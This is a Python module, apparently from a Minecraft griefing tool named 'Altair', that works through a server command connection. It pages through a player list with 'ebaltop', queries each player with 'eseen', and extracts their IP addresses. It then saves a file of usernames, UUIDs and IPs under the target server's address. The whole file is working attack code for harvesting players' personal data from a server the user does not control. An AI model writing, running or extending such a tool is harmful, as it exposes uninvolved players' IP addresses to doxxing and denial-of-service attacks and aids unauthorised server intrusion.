import socket, struct, hashlib, colorama, uuid, re

from colorama import *
from core.utils.packet_utils import *
from core.utils.print_utils import *

colorama.init()

def dbdump(s):
    player_list = []
    ip_database = ''
    packet = command_packet('ebaltop 1')
    s.sendall(packet)
    data = parse_string(s.recv(65500).decode('utf-8', errors='ignore'))
    if len(data.split('\n')) > 3:
        print_loading('getting ip database...')
        page_number = int(re.findall(r'\ \d+/(\d+)\ [\-]+', data)[0])
        for page in range(page_number):
            packet = command_packet('ebaltop ' + str(page))
            s.sendall(packet)
            data = parse_string(s.recv(65500).decode('utf-8', errors='ignore'))
            try:
                players = re.findall(r'\d+\.\ (\w+),\ ', data)
                for player in players:
                    if not player in str(player_list):
                        player_list.append(player)
            except:
                pass
        id = 0
        for player in player_list:
            packet = command_packet('eseen ' + player)
            s.sendall(packet)
            data = parse_string(s.recv(65500).decode('utf-8', errors='ignore'))
            try:
                username = player
                ip_addr = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', data)[0]
                _uuid = uuid.UUID(bytes=hashlib.md5(bytes('OfflinePlayer:' + username, 'utf-8')).digest()[:16], version=3)
                ip_database += f'{id},{username},{_uuid},{ip_addr}\n'
                id += 1
            except Exception as e:
                pass
            
        with open(f'{s.getpeername()[0]}.db.txt', 'a+') as f:
            f.write(f'# db dumped w/Altair (@ToastGriefing on telegram)\nid,username,uuid,ip\n{ip_database}')
        print_success(f'ip database have been saved @ \'{s.getpeername()[0]}.db.txt\'')
    else:
        print_error('there was an error, please run the command again!')
